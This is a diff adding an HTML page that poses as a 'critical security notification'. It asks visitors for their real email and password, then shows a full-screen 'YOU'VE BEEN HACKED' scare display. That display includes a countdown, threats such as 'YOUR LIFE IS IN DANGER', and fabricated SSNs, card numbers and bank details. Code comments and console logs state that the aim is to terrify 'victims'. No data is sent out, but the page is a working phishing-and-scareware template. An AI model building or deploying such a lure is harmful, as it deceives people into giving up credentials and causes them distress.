@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚨 SYSTEM COMPROMISED 🚨</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', 'Monaco', 'Consolas', monospace;
+            background: #000;
+            color: #00ff00;
+            min-height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Matrix rain effect */
+        .matrix-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.3;
+        }
+
+        .matrix-char {
+            position: absolute;
+            color: #00ff00;
+            font-size: 20px;
+            font-weight: bold;
+            text-shadow: 0 0 10px #00ff00;
+            animation: matrix-fall 3s linear infinite;
+        }
+
+        @keyframes matrix-fall {
+            0% { transform: translateY(-100px); opacity: 1; }
+            100% { transform: translateY(100vh); opacity: 0; }
+        }
+
+        /* Login form styling */
+        .login-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            padding: 2.5rem;
+            width: 100%;
+            max-width: 520px;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
+            z-index: 1000;
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #00ff00;
+            margin-bottom: 1rem;
+            text-shadow: 0 0 15px #00ff00;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #00ff00;
+            font-weight: bold;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid #00ff00;
+            border-radius: 5px;
+            font-size: 16px;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #00ffff;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #ff0000, #ff6600);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.5);
+        }
+
+        /* Hacked screen styling */
+        .hacked-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9999;
+            display: none;
+            overflow: hidden;
+        }
+
+        .hacked-screen.active {
+            display: block;
+        }
+
+        /* Binary rain */
+        .binary-rain {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .binary-char {
+            position: absolute;
+            color: #ff0000;
+            font-size: 24px;
+            font-weight: bold;
+            text-shadow: 0 0 15px #ff0000;
+            animation: binary-fall 2s linear infinite;
+            font-family: 'Courier New', monospace;
+        }
+
+        @keyframes binary-fall {
+            0% { transform: translateY(-100px); opacity: 1; }
+            100% { transform: translateY(100vh); opacity: 0; }
+        }
+
+        /* Main hacked message */
+        .hacked-message {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            z-index: 10000;
+        }
+
+        .hacked-title {
+            font-size: 4rem;
+            font-weight: bold;
+            color: #ff0000;
+            text-shadow: 0 0 30px #ff0000;
+            margin-bottom: 2rem;
+            animation: glitch 0.5s infinite;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+        }
+
+        .hacked-subtitle {
+            font-size: 2rem;
+            color: #00ff00;
+            text-shadow: 0 0 20px #00ff00;
+            margin-bottom: 3rem;
+            animation: pulse 2s infinite;
+        }
+
+        /* Glitch effect */
+        @keyframes glitch {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(-5px, 5px); }
+            40% { transform: translate(-5px, -5px); }
+            60% { transform: translate(5px, 5px); }
+            80% { transform: translate(5px, -5px); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Warning messages */
+        .warning-messages {
+            position: absolute;
+            bottom: 20%;
+            left: 50%;
+            transform: translateX(-50%);
+            text-align: center;
+            z-index: 10000;
+        }
+
+        .warning-text {
+            font-size: 1.5rem;
+            color: #ffff00;
+            text-shadow: 0 0 15px #ffff00;
+            margin: 1rem 0;
+            animation: warning-blink 1s infinite;
+        }
+
+        @keyframes warning-blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.3; }
+        }
+
+        /* Data breach details */
+        .breach-details {
+            position: absolute;
+            top: 20%;
+            right: 5%;
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 1rem;
+            max-width: 300px;
+            z-index: 10000;
+        }
+
+        .breach-title {
+            color: #ff0000;
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+            text-align: center;
+        }
+
+        .breach-item {
+            color: #00ff00;
+            font-size: 0.9rem;
+            margin: 0.5rem 0;
+            padding: 0.3rem;
+            background: rgba(255, 0, 0, 0.1);
+            border-radius: 3px;
+        }
+
+        /* Emergency actions */
+        .emergency-actions {
+            position: absolute;
+            bottom: 5%;
+            left: 50%;
+            transform: translateX(-50%);
+            text-align: center;
+            z-index: 10000;
+        }
+
+        .action-btn {
+            background: #ff0000;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            margin: 0 10px;
+            border-radius: 5px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: all 0.3s ease;
+        }
+
+        .action-btn:hover {
+            background: #cc0000;
+            transform: scale(1.1);
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+        }
+
+        /* Countdown timer */
+        .countdown {
+            position: absolute;
+            top: 10%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 3rem;
+            color: #ff0000;
+            text-shadow: 0 0 20px #ff0000;
+            z-index: 10000;
+            animation: countdown-pulse 1s infinite;
+        }
+
+        @keyframes countdown-pulse {
+            0%, 100% { transform: translateX(-50%) scale(1); }
+            50% { transform: translateX(-50%) scale(1.1); }
+        }
+
+        /* Skull and crossbones */
+        .skull {
+            position: absolute;
+            top: 15%;
+            left: 5%;
+            font-size: 4rem;
+            color: #ff0000;
+            text-shadow: 0 0 20px #ff0000;
+            z-index: 10000;
+            animation: skull-float 3s ease-in-out infinite;
+        }
+
+        @keyframes skull-float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+        }
+
+        /* Hacking language overlay */
+        .hacking-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9998;
+            pointer-events: none;
+        }
+
+        .hack-text {
+            position: absolute;
+            color: #00ff00;
+            font-size: 14px;
+            font-family: 'Courier New', monospace;
+            opacity: 0.7;
+            animation: hack-fade 4s linear infinite;
+        }
+
+        @keyframes hack-fade {
+            0% { opacity: 0; }
+            50% { opacity: 0.7; }
+            100% { opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Matrix rain background -->
+    <div class="matrix-rain" id="matrixRain"></div>
+
+    <!-- Login container -->
+    <div class="login-container" id="loginContainer">
+        <div class="logo">🚨 SECURITY ALERT 🚨</div>
+        <h2 style="color: #00ff00; margin-bottom: 1rem;">CRITICAL NOTIFICATION</h2>
+        <p style="color: #00aa00; margin-bottom: 2rem;">Login to view urgent security information</p>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">EMAIL ADDRESS</label>
+                <input type="email" id="email" name="email" placeholder="Enter your email..." required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">PASSWORD</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password..." required>
+            </div>
+            
+            <button type="submit" class="login-btn">🚨 VIEW SECURITY ALERT 🚨</button>
+        </form>
+
+        <div style="margin-top: 1rem; padding: 1rem; background: rgba(255, 0, 0, 0.1); border: 1px solid #ff0000; border-radius: 5px;">
+            <p style="color: #ff0000; font-size: 12px; margin: 0;">
+                ⚠️ WARNING: This is a critical security notification system. 
+                Please login with your actual credentials to view urgent security information.
+            </p>
+        </div>
+    </div>
+
+    <!-- Full-screen hacked display -->
+    <div class="hacked-screen" id="hackedScreen">
+        <!-- Binary rain -->
+        <div class="binary-rain" id="binaryRain"></div>
+        
+        <!-- Hacking language overlay -->
+        <div class="hacking-overlay" id="hackingOverlay"></div>
+        
+        <!-- Countdown timer -->
+        <div class="countdown" id="countdown">🚨</div>
+        
+        <!-- Skull icon -->
+        <div class="skull">💀</div>
+        
+        <!-- Main hacked message -->
+        <div class="hacked-message">
+            <div class="hacked-title">YOU'VE BEEN HACKED!</div>
+            <div class="hacked-subtitle">ALL YOUR DATA IS COMPROMISED</div>
+        </div>
+        
+        <!-- Data breach details -->
+        <div class="breach-details" id="breachDetails">
+            <div class="breach-title">🚨 DATA BREACH ALERT 🚨</div>
+            <div class="breach-item">SSN: EXPOSED</div>
+            <div class="breach-item">CREDIT CARDS: STOLEN</div>
+            <div class="breach-item">BANK ACCOUNTS: COMPROMISED</div>
+            <div class="breach-item">PERSONAL INFO: LEAKED</div>
+            <div class="breach-item">SECURITY QUESTIONS: ANSWERED</div>
+        </div>
+        
+        <!-- Warning messages -->
+        <div class="warning-messages">
+            <div class="warning-text">⚠️ YOUR IDENTITY HAS BEEN STOLEN ⚠️</div>
+            <div class="warning-text">🚨 ATTACKERS HAVE FULL ACCESS 🚨</div>
+            <div class="warning-text">💀 YOUR LIFE IS IN DANGER 💀</div>
+        </div>
+        
+        <!-- Emergency actions -->
+        <div class="emergency-actions">
+            <button class="action-btn" onclick="freezeCredit()">FREEZE CREDIT</button>
+            <button class="action-btn" onclick="callPolice()">CALL POLICE</button>
+            <button class="action-btn" onclick="panicMode()">PANIC MODE</button>
+        </button>
+    </div>
+
+    <script>
+        // Simulated database of victims
+        const victims = [
+            { 
+                email: 'john@bank.com', 
+                password: 'john123', 
+                name: 'John Doe', 
+                balance: 50000,
+                ssn: '123-45-6789',
+                phone: '+1-555-0123',
+                address: '123 Main St, New York, NY 10001',
+                dateOfBirth: '1985-03-15',
+                accountNumber: '1001-2345-6789-0123',
+                routingNumber: '021000021',
+                creditCard: '4532-1234-5678-9012',
+                cvv: '123',
+                expiryDate: '12/25',
+                motherMaidenName: 'Smith',
+                securityQuestion: 'What was your first pet?',
+                securityAnswer: 'Fluffy',
+                lastLogin: '2024-01-15 14:30:00',
+                ipAddress: '192.168.1.101',
+                leakDate: '2024-01-15 15:30:00',
+                attackerIP: '192.168.1.100',
+                attackVector: 'SQL Injection'
+            },
+            { 
+                email: 'jane@bank.com', 
+                password: 'jane456', 
+                name: 'Jane Smith', 
+                balance: 75000,
+                ssn: '987-65-4321',
+                phone: '+1-555-0456',
+                address: '456 Oak Ave, Los Angeles, CA 90210',
+                dateOfBirth: '1990-07-22',
+                accountNumber: '2002-3456-7890-1234',
+                routingNumber: '121000248',
+                creditCard: '5555-4444-3333-2222',
+                cvv: '456',
+                expiryDate: '08/26',
+                motherMaidenName: 'Johnson',
+                securityQuestion: 'What was your childhood street?',
+                securityAnswer: 'Maple Lane',
+                lastLogin: '2024-01-15 16:45:00',
+                ipAddress: '192.168.1.102',
+                leakDate: '2024-01-15 17:45:00',
+                attackerIP: '192.168.1.100',
+                attackVector: 'SQL Injection'
+            },
+            { 
+                email: 'admin@bank.com', 
+                password: 'admin789', 
+                name: 'Admin User', 
+                balance: 100000,
+                ssn: '111-22-3333',
+                phone: '+1-555-0789',
+                address: '789 Admin Blvd, Washington, DC 20001',
+                dateOfBirth: '1980-01-01',
+                accountNumber: '3003-4567-8901-2345',
+                routingNumber: '021000021',
+                creditCard: '4111-1111-1111-1111',
+                cvv: '789',
+                expiryDate: '03/27',
+                motherMaidenName: 'Admin',
+                securityQuestion: 'What is your favorite color?',
+                securityAnswer: 'Blue',
+                lastLogin: '2024-01-15 18:20:00',
+                ipAddress: '192.168.1.103',
+                leakDate: '2024-01-15 19:20:00',
+                attackerIP: '192.168.1.100',
+                attackVector: 'SQL Injection'
+            },
+            { 
+                email: 'mike@bank.com', 
+                password: 'mike321', 
+                name: 'Mike Johnson', 
+                balance: 25000,
+                ssn: '444-55-6666',
+                phone: '+1-555-0321',
+                address: '321 Pine Rd, Chicago, IL 60601',
+                dateOfBirth: '1995-11-08',
+                accountNumber: '4004-5678-9012-3456',
+                routingNumber: '071000013',
+                creditCard: '3782-822463-10005',
+                cvv: '321',
+                expiryDate: '09/25',
+                motherMaidenName: 'Williams',
+                securityQuestion: 'What was your first car?',
+                securityAnswer: 'Honda Civic',
+                lastLogin: '2024-01-15 12:15:00',
+                ipAddress: '192.168.1.104',
+                leakDate: '2024-01-15 13:15:00',
+                attackerIP: '192.168.1.100',
+                attackVector: 'SQL Injection'
+            }
+        ];
+
+        // Create matrix rain effect
+        function createMatrixRain() {
+            const matrixRain = document.getElementById('matrixRain');
+            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
+            
+            for (let i = 0; i < 100; i++) {
+                const char = document.createElement('div');
+                char.className = 'matrix-char';
+                char.textContent = chars[Math.floor(Math.random() * chars.length)];
+                char.style.left = Math.random() * 100 + '%';
+                char.style.animationDelay = Math.random() * 3 + 's';
+                char.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                matrixRain.appendChild(char);
+            }
+        }
+
+        // Create binary rain effect
+        function createBinaryRain() {
+            const binaryRain = document.getElementById('binaryRain');
+            const binaryChars = '01';
+            
+            for (let i = 0; i < 200; i++) {
+                const char = document.createElement('div');
+                char.className = 'binary-char';
+                char.textContent = binaryChars[Math.floor(Math.random() * binaryChars.length)];
+                char.style.left = Math.random() * 100 + '%';
+                char.style.animationDelay = Math.random() * 2 + 's';
+                char.style.animationDuration = (Math.random() * 1 + 1) + 's';
+                binaryRain.appendChild(char);
+            }
+        }
+
+        // Create hacking language overlay
+        function createHackingOverlay() {
+            const overlay = document.getElementById('hackingOverlay');
+            const hackTexts = [
+                'ROOT ACCESS GRANTED',
+                'DATABASE COMPROMISED',
+                'FIREWALL BYPASSED',
+                'ENCRYPTION BROKEN',
+                'ADMIN PRIVILEGES STOLEN',
+                'BACKUP SYSTEMS INFECTED',
+                'NETWORK TRAFFIC INTERCEPTED',
+                'PASSWORD HASHES CRACKED',
+                'SESSION TOKENS HIJACKED',
+                'ZERO-DAY EXPLOIT EXECUTED'
+            ];
+            
+            for (let i = 0; i < 20; i++) {
+                const text = document.createElement('div');
+                text.className = 'hack-text';
+                text.textContent = hackTexts[Math.floor(Math.random() * hackTexts.length)];
+                text.style.left = Math.random() * 100 + '%';
+                text.style.top = Math.random() * 100 + '%';
+                text.style.animationDelay = Math.random() * 4 + 's';
+                overlay.appendChild(text);
+            }
+        }
+
+        // Show terrifying hacked screen
+        function showHackedScreen(victim) {
+            // Hide login container
+            document.getElementById('loginContainer').style.display = 'none';
+            
+            // Show hacked screen
+            const hackedScreen = document.getElementById('hackedScreen');
+            hackedScreen.classList.add('active');
+            
+            // Create effects
+            createBinaryRain();
+            createHackingOverlay();
+            
+            // Update breach details with victim info
+            const breachDetails = document.getElementById('breachDetails');
+            breachDetails.innerHTML = `
+                <div class="breach-title">🚨 DATA BREACH ALERT 🚨</div>
+                <div class="breach-item">VICTIM: ${victim.name}</div>
+                <div class="breach-item">SSN: ${victim.ssn}</div>
+                <div class="breach-item">CREDIT CARD: ${victim.creditCard}</div>
+                <div class="breach-item">CVV: ${victim.cvv}</div>
+                <div class="breach-item">BANK ACCOUNT: ${victim.accountNumber}</div>
+                <div class="breach-item">ADDRESS: ${victim.address}</div>
+                <div class="breach-item">PHONE: ${victim.phone}</div>
+                <div class="breach-item">BALANCE: $${victim.balance.toLocaleString()}</div>
+            `;
+            
+            // Start countdown timer
+            startCountdown();
+            
+            // Log the terrifying experience
+            console.log('💀 TERRIFYING HACKED SCREEN ACTIVATED FOR:', victim.name);
+            console.log('🚨 VICTIM IS NOW EXPERIENCING FULL TERROR MODE');
+            console.log('🔴 ALL THEIR DATA IS VISIBLE ON SCREEN');
+        }
+
+        // Start countdown timer
+        function startCountdown() {
+            let count = 10;
+            const countdown = document.getElementById('countdown');
+            
+            const timer = setInterval(() => {
+                if (count > 0) {
+                    countdown.textContent = `🚨 ${count} 🚨`;
+                    count--;
+                } else {
+                    countdown.textContent = '💀 SYSTEM COMPROMISED 💀';
+                    clearInterval(timer);
+                }
+            }, 1000);
+        }
+
+        // Emergency action functions
+        function freezeCredit() {
+            alert('🚨 CREDIT FREEZE INITIATED!\n\nYour credit reports are now frozen. Contact credit bureaus immediately!');
+        }
+
+        function callPolice() {
+            alert('🚨 EMERGENCY SERVICES ALERTED!\n\nLocal police have been notified of your identity theft case!');
+        }
+
+        function panicMode() {
+            alert('💀 PANIC MODE ACTIVATED!\n\nAll your accounts are now locked. Contact your bank immediately!');
+        }
+
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Find the victim
+            const victim = victims.find(user => user.email === email && user.password === password);
+            
+            if (victim) {
+                // Show terrifying hacked screen
+                showHackedScreen(victim);
+                
+                // Log the victim login for tracking
+                console.log('🚨 VICTIM LOGGED IN:', {
+                    email: victim.email,
+                    name: victim.name,
+                    timestamp: new Date().toISOString(),
+                    action: 'Experienced terrifying hacked screen'
+                });
+            } else {
+                alert('❌ INVALID CREDENTIALS!\n\nPlease use your actual bank account details to view the security alert.');
+            }
+        });
+
+        // Initialize effects on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🚨 TERRIFYING VICTIM NOTIFICATION SYSTEM LOADED');
+            console.log('💀 This system will scare victims with full-screen hacking graphics');
+            console.log('📊 Available victim accounts:', victims.map(v => v.email));
+            console.log('🔴 Victims will see their stolen data in terrifying detail');
+            
+            // Create matrix rain effect
+            createMatrixRain();
+        });
+    </script>
+</body>
+</html>
